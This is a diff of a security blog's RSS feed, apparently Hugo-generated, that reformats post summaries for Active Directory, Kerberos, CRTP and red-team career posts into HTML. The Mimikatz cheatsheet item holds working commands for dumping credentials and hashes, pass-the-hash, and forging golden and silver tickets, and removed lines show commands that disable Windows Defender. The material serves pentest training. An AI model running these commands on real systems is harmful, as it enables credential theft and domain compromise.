@@ -13,9 +13,23 @@
       <pubDate>Sun, 12 Jun 2022 00:36:33 +0530</pubDate>
       
       <guid>http://localhost:1313/ad-cheatsheet/</guid>
-      <description>Active Directory (AD) Cheatsheet This post assumes that opsec is not required and you can be as noisy as may be required to perform the enumeration and lateral movement. This post is meant for pentesters as well as defenders for the same reason - understand the AD environment better.
-This cheatsheet would help some certifications like CRTP, OSCP, PNPT, and such.
-Note: Only a subset of flags and switches, which are most commonly used, are shared.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;active-directory-ad-cheatsheet&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;Active Directory (AD) Cheatsheet
+  &lt;a href=&#34;#active-directory-ad-cheatsheet&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;p&gt;This post assumes that opsec is not required and you can be as noisy as may be required to perform the enumeration and lateral movement. This post is meant for pentesters as well as defenders for the same reason - understand the AD environment better.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -24,8 +38,39 @@ Note: Only a subset of flags and switches, which are most commonly used, are sha
       <pubDate>Fri, 15 Oct 2021 22:17:51 +0000</pubDate>
       
       <guid>http://localhost:1313/activedirectory/kerberoast/</guid>
-      <description>Attacking Kerberos - Kerberoasting Introduction Kerberoasting is a very popular attack in the Active Directory realm since over 6 years now. Attacking guard dog of Hades by Tim Meddin
-Overview In any organization that is using Active Directory, the authentication process is done via Kerberos since a while now. While Kerberos is a secure network authentication protocol, there are several gaps inherently with the way it works. To read about how Kerberos works in more detail, you can read Introduction to Kerberos post.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;attacking-kerberos---kerberoasting&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;Attacking Kerberos - Kerberoasting
+  &lt;a href=&#34;#attacking-kerberos---kerberoasting&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;introduction&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Introduction
+  &lt;a href=&#34;#introduction&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;Kerberoasting is a very popular attack in the Active Directory realm since over 6 years now.  Attacking guard dog of Hades by Tim Meddin&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -34,8 +79,23 @@ Overview In any organization that is using Active Directory, the authentication 
       <pubDate>Fri, 15 Oct 2021 15:21:59 +0000</pubDate>
       
       <guid>http://localhost:1313/activedirectory/kerberos-intro/</guid>
-      <description>Introduction to Kerberos Hi and welcome to the second post in the Active Directory series. In this post, we will start off with what kerberos even is and then dive in to understand how the authentication work. With that said, let&amp;rsquo;s get started.
-What is Kerberos? Kerberos is a network authentication protocol, first developed by the folks at MIT and was later adopted by Microsoft to incorporate it as their default authentication method.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;introduction-to-kerberos&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;Introduction to Kerberos
+  &lt;a href=&#34;#introduction-to-kerberos&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;p&gt;Hi and welcome to the second post in the Active Directory series. In this post, we will start off with what kerberos even is and then dive in to understand how the authentication work. With that said, let&amp;rsquo;s get started.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -44,7 +104,39 @@ What is Kerberos? Kerberos is a network authentication protocol, first developed
       <pubDate>Sun, 10 Oct 2021 08:23:07 +0000</pubDate>
       
       <guid>http://localhost:1313/activedirectory/ad-intro/</guid>
-      <description>Introduction to Active Directory Prologue Hello there! Welcome to the first post in the Active Directory series, this post talks about AD in brief and does not go in detail at all. The objective of this post is to have a starting point in the series of AD related posts and can assist a person in understanding what AD is in general before learning about either attacks or defenses in AD.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;introduction-to-active-directory&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;Introduction to Active Directory
+  &lt;a href=&#34;#introduction-to-active-directory&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;prologue&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Prologue
+  &lt;a href=&#34;#prologue&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;Hello there! Welcome to the first post in the Active Directory series, this post talks about AD in brief and does not go in detail at all. The objective of this post is to have a starting point in the series of AD related posts and can assist a person in understanding what AD is in general before learning about either attacks or defenses in AD. With that being said, let&amp;rsquo;s get started.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -53,9 +145,40 @@ What is Kerberos? Kerberos is a network authentication protocol, first developed
       <pubDate>Wed, 23 Dec 2020 22:30:19 +0000</pubDate>
       
       <guid>http://localhost:1313/crtp-cheatsheet/</guid>
-      <description>CRTP Cheatsheet This cheatsheet corresponds to an older version of PowerView deliberately as this is the version that was used in Pentester Academys&amp;rsquo; CRTP certification course. Updated AD enumeration (PowerView/SharpHound) cheatsheet can be found at AD Enumeration
-Helpful Commands Commands to help use PowerView even better.
-Command Description Set-MpPreference -DisableRealTimeMonitoring $true Disable Windows Defender real time monitoring Set-MpPreference -DisableIOAVProtection $true Disable Windows Defender scanning for all files downloaded Disabling Defender even if for a small amount of time puts the assets at risk, instead one could opt for bypassing AMSI using this resource.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;crtp-cheatsheet&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;CRTP Cheatsheet
+  &lt;a href=&#34;#crtp-cheatsheet&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;p&gt;This cheatsheet corresponds to an older version of PowerView deliberately as this is the version that was used in Pentester Academys&amp;rsquo; CRTP certification course. Updated AD enumeration (PowerView/SharpHound) cheatsheet can be found at &lt;a href=&#34;http://localhost:1313/ad-cheatsheet&#34;&gt;AD Enumeration&lt;/a&gt;&lt;/p&gt;
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;helpful-commands&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Helpful Commands
+  &lt;a href=&#34;#helpful-commands&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;Commands to help use PowerView even better.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -64,8 +187,147 @@ Command Description Set-MpPreference -DisableRealTimeMonitoring $true Disable Wi
       <pubDate>Sun, 22 Nov 2020 17:20:01 +0000</pubDate>
       
       <guid>http://localhost:1313/mimikatz-cheatsheet/</guid>
-      <description>Mimikatz Cheatsheet Dump Creds Invoke-Mimikatz -DumpCredsInvoke-Mimikatz -DumpCreds -ComputerName @(&amp;quot;server1&amp;quot;,&amp;quot;server2&amp;quot;)Over Pass The Hash Invoke-Mimikatz -Command &amp;quot;sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:&amp;lt;ntlm_hash&amp;gt; /run:powershell.exe&amp;quot;Dump Hashes Invoke-Mimikatz -Command &#39;&amp;quot;lsadump::lsa /patch&amp;quot;&#39; -ComputerName dcorp-dcCreating Tickets Create A Golden Ticket Invoke-Mimikatz -Command &#39;&amp;quot;kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:&amp;lt;domain_SID&amp;gt; /krbtgt:&amp;lt;NTLM_hash&amp;gt; id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&amp;quot;&#39;Create A Silver Ticket Invoke-Mimikatz -Command &#39;&amp;quot;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt&amp;quot;&#39;DCSync Attack DA privileges required!
-Invoke-Mimikatz -Command &#39;&amp;quot;lsadump::dcsync /user:dcorp\krbtgt&amp;quot;&#39; </description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;mimikatz-cheatsheet&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;Mimikatz Cheatsheet
+  &lt;a href=&#34;#mimikatz-cheatsheet&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;dump-creds&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Dump Creds
+  &lt;a href=&#34;#dump-creds&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;Invoke-Mimikatz -DumpCreds
+
+Invoke-Mimikatz -DumpCreds -ComputerName @(&amp;quot;server1&amp;quot;,&amp;quot;server2&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;over-pass-the-hash&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Over Pass The Hash
+  &lt;a href=&#34;#over-pass-the-hash&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;Invoke-Mimikatz -Command &amp;quot;sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:&amp;lt;ntlm_hash&amp;gt; /run:powershell.exe&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;dump-hashes&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Dump Hashes
+  &lt;a href=&#34;#dump-hashes&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;Invoke-Mimikatz -Command &#39;&amp;quot;lsadump::lsa /patch&amp;quot;&#39; -ComputerName dcorp-dc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;creating-tickets&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Creating Tickets
+  &lt;a href=&#34;#creating-tickets&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;create-a-golden-ticket&#34; --&gt;
+
+&lt;h3 class=&#34;header-anchor-wrapper&#34;&gt;Create A Golden Ticket
+  &lt;a href=&#34;#create-a-golden-ticket&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;Invoke-Mimikatz -Command &#39;&amp;quot;kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:&amp;lt;domain_SID&amp;gt; /krbtgt:&amp;lt;NTLM_hash&amp;gt; id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&amp;quot;&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;create-a-silver-ticket&#34; --&gt;
+
+&lt;h3 class=&#34;header-anchor-wrapper&#34;&gt;Create A Silver Ticket
+  &lt;a href=&#34;#create-a-silver-ticket&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;Invoke-Mimikatz -Command &#39;&amp;quot;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt&amp;quot;&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;dcsync-attack&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;DCSync Attack
+  &lt;a href=&#34;#dcsync-attack&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;DA privileges required!&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -74,9 +336,39 @@ Invoke-Mimikatz -Command &#39;&amp;quot;lsadump::dcsync /user:dcorp\krbtgt&amp;q
       <pubDate>Mon, 31 Aug 2020 15:48:04 +0000</pubDate>
       
       <guid>http://localhost:1313/starting-point/</guid>
-      <description>Getting Into Cybersecurity - Red Team Edition Introduction I came across this question and was asked so often that I decided to turn it into a blog post.
-Since finance is one of the biggest barrier that one could face, every resource listed here will be either completely free or at least provide a good amount of free resources/content.
-Disclaimer The following suggestions will be more towards getting into penetration testing or red teaming but if that is not your thing or rather you do not know what your thing is I would highly recommend reading through Lesley Carharts&amp;rsquo; Starting an InfoSec Career - The Megamix series.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;getting-into-cybersecurity---red-team-edition&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;Getting Into Cybersecurity - Red Team Edition
+  &lt;a href=&#34;#getting-into-cybersecurity---red-team-edition&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
